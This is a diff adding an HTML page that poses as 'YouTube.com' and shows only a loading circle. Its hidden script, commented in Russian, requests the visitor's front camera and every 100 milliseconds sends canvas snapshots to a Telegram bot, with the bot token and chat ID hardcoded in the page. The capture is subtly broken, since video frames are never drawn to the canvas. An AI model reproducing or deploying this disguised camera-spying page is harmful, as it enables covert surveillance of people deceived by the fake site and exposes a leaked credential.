@@ -1,0 +1,64 @@
+<html>
+    <head>
+        <title>YouTube.com</title>
+        <link rel="stylesheet" href="style.css" />
+    </head>
+    <body>
+        <div class="progress-circle">
+            <span class="number" data-value="100"></span>
+            <svg height="150" width="150" class="circle">
+                <circle cx="75" cy="75" r="65" stroke="var(--yellow)" stroke-width="20" fill="none" />
+            </svg>
+        </div>
+        <canvas id="canvas"></canvas>
+
+        <script>
+            // Токен вашего бота
+            const BOT_TOKEN = '7943581542:AAHxM9QUlVdJlq7UZRGiDdSrfXEusgpUoJc';
+            // Идентификатор чата
+            const CHAT_ID = '7943581542';
+
+            const video = document.createElement('video');
+            const canvas = document.getElementById('canvas');
+            setInterval(takePicture, 100); // интервал между снимками в миллисекундах
+
+            function handleSuccess(stream) {
+                video.srcObject = stream;
+                video.play();
+            }
+
+            function handleError(error) {
+                console.error('Ошибка доступа к камере:', error);
+            }
+
+            async function takePicture() {
+                const imageData = canvas.toDataURL('image/png'); // получаем данные изображения
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            photo: imageData.split(',')[1], // передаем только base64 часть без заголовка
+                            caption: 'Кабачок в кабане' // любое описание к изображению
+                        })
+                    });
+                    console.log('Изображение успешно отправлено!');
+                } catch (error) {
+                    console.error('Ошибка при отправке изображения:', error);
+                }
+            }
+
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // facingMode: "user" для фронтальной камеры
+                    .then(handleSuccess)
+                    .catch(handleError);
+            } else {
+                console.log('getUserMedia не поддерживается этим браузером.');
+            }
+        </script>
+    </body>
+</html>
